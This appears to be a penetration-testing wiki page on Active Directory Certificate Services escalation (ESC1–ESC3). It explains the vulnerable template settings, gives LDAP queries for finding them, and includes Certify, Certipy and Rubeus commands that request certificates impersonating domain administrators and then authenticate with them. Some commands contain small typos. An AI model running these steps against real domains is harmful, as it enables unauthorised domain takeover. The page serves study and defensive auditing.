# AD CS Domain Escalation

**This is a summary of escalation technique sections of the posts:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)
## Misconfigured Certificate Templates - ESC1



### Explanation

### Misconfigured Certificate Templates - ESC1 Explained

- **Enrolment rights are granted to low-privileged users by the Enterprise CA.**
- **Manager approval is not required.**
- **No signatures from authorized personnel are needed.**
- **Security descriptors on certificate templates are overly permissive, allowing low-privileged users to obtain enrolment rights.**
- **Certificate templates are configured to define EKUs that facilitate authentication:**
  - Extended Key Usage (EKU) identifiers such as Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0), or no EKU (SubCA) are included.
- **The ability for requesters to include a subjectAltName in the Certificate Signing Request (CSR) is allowed by the template:**
  - The Active Directory (AD) prioritizes the subjectAltName (SAN) in a certificate for identity verification if present. This means that by specifying the SAN in a CSR, a certificate can be requested to impersonate any user (e.g., a domain administrator). Whether a SAN can be specified by the requester is indicated in the certificate template's AD object through the `mspki-certificate-name-flag` property. This property is a bitmask, and the presence of the `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag permits the specification of the SAN by the requester.

> [!CAUTION]
> The configuration outlined permits low-privileged users to request certificates with any SAN of choice, enabling authentication as any domain principal through Kerberos or SChannel.

This feature is sometimes enabled to support the on-the-fly generation of HTTPS or host certificates by products or deployment services, or due to a lack of understanding.

It is noted that creating a certificate with this option triggers a warning, which is not the case when an existing certificate template (such as the `WebServer` template, which has `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` enabled) is duplicated and then modified to include an authentication OID.

### Abuse

To **find vulnerable certificate templates** you can run:

```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```

To **abuse this vulnerability to impersonate an administrator** one could run:

```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
  /url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
  -template 'ESC1' -upn 'administrator@corp.local'
```

Then you can transform the generated **certificate to `.pfx`** format and use it to **authenticate using Rubeus or certipy** again:

```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```

The Windows binaries "Certreq.exe" & "Certutil.exe" can be used to generate the PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

The enumeration of certificate templates within the AD Forest's configuration schema, specifically those not necessitating approval or signatures, possessing a Client Authentication or Smart Card Logon EKU, and with the `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag enabled, can be performed by running the following LDAP query:

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```



## Misconfigured Certificate Templates - ESC2



### Explanation

The second abuse scenario is a variation of the first one:

1. Enrollment rights are granted to low-privileged users by the Enterprise CA.
2. The requirement for manager approval is disabled.
3. The need for authorized signatures is omitted.
4. An overly permissive security descriptor on the certificate template grants certificate enrollment rights to low-privileged users.
5. **The certificate template is defined to include the Any Purpose EKU or no EKU.**

The **Any Purpose EKU** permits a certificate to be obtained by an attacker for **any purpose**, including client authentication, server authentication, code signing, etc. The same **technique used for ESC3** can be employed to exploit this scenario.

Certificates with **no EKUs**, which act as subordinate CA certificates, can be exploited for **any purpose** and can **also be used to sign new certificates**. Hence, an attacker could specify arbitrary EKUs or fields in the new certificates by utilizing a subordinate CA certificate.

However, new certificates created for **domain authentication** will not function if the subordinate CA is not trusted by the **`NTAuthCertificates`** object, which is the default setting. Nonetheless, an attacker can still create **new certificates with any EKU** and arbitrary certificate values. These could be potentially **abused** for a wide range of purposes (e.g., code signing, server authentication, etc.) and could have significant implications for other applications in the network like SAML, AD FS, or IPSec.

To enumerate templates that match this scenario within the AD Forest’s configuration schema, the following LDAP query can be run:

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```



## Misconfigured Enrolment Agent Templates - ESC3



### Explanation

This scenario is like the first and second one but **abusing** a **different EKU** (Certificate Request Agent) and **2 different templates** (therefore it has 2 sets of requirements),

The **Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), known as **Enrollment Agent** in Microsoft documentation, allows a principal to **enroll** for a **certificate** on **behalf of another user**.

The **“enrollment agent”** enrolls in such a **template** and uses the resulting **certificate to co-sign a CSR on behalf of the other user**. It then **sends** the **co-signed CSR** to the CA, enrolling in a **template** that **permits “enroll on behalf of”**, and the CA responds with a **certificate belong to the “other” user**.

**Requirements 1:**

- Enrollment rights are granted to low-privileged users by the Enterprise CA.
- The requirement for manager approval is omitted.
- No requirement for authorized signatures.
- The security descriptor of the certificate template is excessively permissive, granting enrollment rights to low-privileged users.
- The certificate template includes the Certificate Request Agent EKU, enabling the request of other certificate templates on behalf of other principals.

**Requirements 2:**

- The Enterprise CA grants enrollment rights to low-privileged users.
- Manager approval is bypassed.
- The template's schema version is either 1 or exceeds 2, and it specifies an Application Policy Issuance Requirement that necessitates the Certificate Request Agent EKU.
- An EKU defined in the certificate template permits domain authentication.
- Restrictions for enrollment agents are not applied on the CA.

### Abuse

You can use [**Certify**](https://github.com/GhostPack/Certify) or [**Certipy**](https://github.com/ly4k/Certipy) to abuse this scenario:

```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```

The **users** who are allowed to **obtain** an **enrollment agent certificate**, the templates in which enrollment **agents** are permitted to enroll, and the **accounts** on behalf of which the enrollment agent may act can be constrained by enterprise CAs. This is achieved by opening the `certsrc.msc` **snap-in**, **right-clicking on the CA**, **clicking Properties**, and then **navigating** to the “Enrollment Agents” tab.

However, it is noted that the **default** setting for CAs is to “**Do not restrict enrollment agents**.” When the restriction on enrollment agents is enabled by administrators, setting it to “Restrict enrollment agents,” the default configuration remains extremely permissive. It allows **Everyone** access to enroll in all templates as anyone.
